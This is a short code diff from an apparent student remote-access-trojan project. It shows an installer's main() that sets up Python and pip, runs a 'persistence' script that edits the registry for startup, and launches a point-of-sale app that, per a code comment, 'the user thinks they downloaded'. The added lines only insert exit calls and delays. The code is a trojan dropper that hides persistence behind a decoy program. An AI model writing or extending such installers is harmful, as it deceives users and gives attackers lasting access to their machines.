@@ -18,10 +18,13 @@ int main()
     system("setx path \"%PATH%;C:\\Python38\\\"");
     system("setx path \"%PATH%;C:\\Python38\\Scripts\\\""); //adds the right path for pip
     Sleep(2000);
+    system("exit");
+    Sleep(10000);
     system("start /WAIT pip install openpyxl\n"); //openpyxl is needed to run pos.py
     Sleep(2000);
     system("python .\\persistence\\add_startup.py\n"); //starts the registry editing py file after python is installed
     system(".\\UDP_Connection\\pos.pyw\n"); //starts the POS the user thinks they downloaded
     system("cd \"C:\\Users\\IEUser\\Desktop\\TEAMPROJRAT-master\\UDP_Connection\\\" && pos.pyw");
+    system("exit");
     return 0;
 }
